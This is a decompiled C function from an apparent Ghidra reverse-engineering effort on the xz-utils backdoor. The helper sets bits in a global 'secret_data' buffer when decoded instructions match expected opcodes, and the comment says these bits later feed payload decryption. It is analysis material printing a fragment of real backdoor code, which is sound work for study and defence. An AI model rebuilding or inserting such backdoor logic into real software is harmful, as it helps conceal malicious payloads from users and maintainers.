// /home/kali/xzre-ghidra/xzregh/10A990_secret_data_append_from_instruction.c
// Function: secret_data_append_from_instruction @ 0x10A990
// Calling convention: unknown
// Prototype: undefined secret_data_append_from_instruction(void)


/*
 * AutoDoc: Evaluates a decoded instruction and, when it matches expected patterns, sets a bit inside `global_ctx->secret_data`. The loader uses it to encode "this function looks intact" attestation bits that are later consumed during payload decryption.
 */
#include "xzre_types.h"


undefined8 secret_data_append_from_instruction(long param_1,uint *param_2)

{
  byte *pbVar1;
  uint uVar2;
  int iVar3;
  
  uVar2 = *param_2;
  if (uVar2 < 0x1c8) {
    iVar3 = *(int *)(param_1 + 0x28);
    if (((iVar3 != 0x109) && (iVar3 != 0xbb)) &&
       ((0x2e < iVar3 - 0x83U || ((0x410100000101U >> ((byte)(iVar3 - 0x83U) & 0x3f) & 1) == 0)))) {
      pbVar1 = (byte *)(global_ctx + 0x108 + (ulong)(uVar2 >> 3));
      *pbVar1 = *pbVar1 | (byte)(1 << ((byte)uVar2 & 7));
    }
    *param_2 = uVar2 + 1;
  }
  return 1;
}

